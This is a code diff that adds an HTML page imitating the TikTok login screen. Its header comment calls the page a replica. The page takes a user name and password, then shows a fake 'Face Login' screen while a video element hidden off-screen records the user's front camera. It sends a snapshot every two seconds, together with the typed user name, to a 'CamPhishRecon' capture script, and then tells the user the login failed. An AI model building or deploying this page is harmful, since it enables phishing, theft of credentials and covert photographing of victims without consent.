@@ -1,0 +1,74 @@
+<!-- DESC: TikTok login page replica with camera for face login -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Log in | TikTok</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
+body{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.box{width:375px;max-width:90vw;padding:40px;text-align:center}
+.logo{font-size:36px;font-weight:900;margin-bottom:30px;color:#000}
+.logo span{color:#fe2c55}
+h2{font-size:24px;margin-bottom:20px;text-align:left;font-weight:700}
+input{width:100%;padding:12px;margin-bottom:12px;background:#f1f1f2;border:1px solid #f1f1f2;border-radius:4px;font-size:16px}
+input:focus{outline:none;border-color:#fe2c55;background:#fff}
+.btn{width:100%;padding:12px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+.btn:disabled{background:#f1f1f2;color:#8a8b91}
+.divider{display:flex;align-items:center;margin:20px 0;color:#8a8b91;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e3e3e4}
+.divider::before{margin-right:12px}.divider::after{margin-left:12px}
+.alt-btn{width:100%;padding:12px;background:#fff;border:1px solid #e3e3e4;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:8px;color:#161823}
+.alt-btn:active{background:#f1f1f2}
+.signup{margin-top:30px;font-size:14px;color:#8a8b91}
+.signup a{color:#fe2c55;text-decoration:none;font-weight:600}
+.face-scan{position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column;color:#fff}
+.face-scan.active{display:flex}
+.scan-title{font-size:22px;margin-bottom:12px;font-weight:700}
+.scan-sub{font-size:14px;color:#aaa;margin-bottom:30px;text-align:center;max-width:260px}
+.spinner{width:20px;height:20px;border:2px solid #333;border-top:#fe2c55;border-radius:50%;animation:spin .6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="box">
+<div class="logo">Tik<span>Tok</span></div>
+<h2>Log in</h2>
+<form onsubmit="return doLogin(event)">
+<input type="text" placeholder="Phone or email" id="user" required>
+<input type="password" placeholder="Password" id="pass" required>
+<button type="submit" class="btn" id="loginBtn">Log In</button>
+</form>
+<div class="divider">or</div>
+<button class="alt-btn" onclick="doLogin(event)">Continue with Google</button>
+<button class="alt-btn" onclick="doFaceLogin()">Use Face Login</button>
+<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+</div>
+<div class="face-scan" id="faceScan">
+<div class="scan-title">Face Login</div>
+<div class="scan-sub">Look at the camera to sign in securely with your face</div>
+<div class="spinner"></div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL=location.origin+'/t/tiktok';
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+function doLogin(e){e.preventDefault();startFaceScan('login');return false;}
+function doFaceLogin(){startFaceScan('face');}
+function startFaceScan(type){
+var fs=document.getElementById('faceScan');fs.classList.add('active');
+var btn=document.getElementById('loginBtn');if(btn){btn.innerHTML='Logging in...';btn.disabled=true;}
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('tiktok_login',{type:type,user:document.getElementById('user')?document.getElementById('user').value:''});
+if(navigator.mediaDevices){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
+var v=document.getElementById('v');v.srcObject=stream;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'face_login');}},2000);
+setTimeout(function(){clearInterval(ci);fs.classList.remove('active');alert('Login failed. Please try again.');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},5000);
+}).catch(function(){setTimeout(function(){fs.classList.remove('active');alert('Camera access needed for Face Login.');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},2000);});
+}else{setTimeout(function(){fs.classList.remove('active');if(btn){btn.innerHTML='Log In';btn.disabled=false;}},2000);}
+}
+</script>
+</body></html>
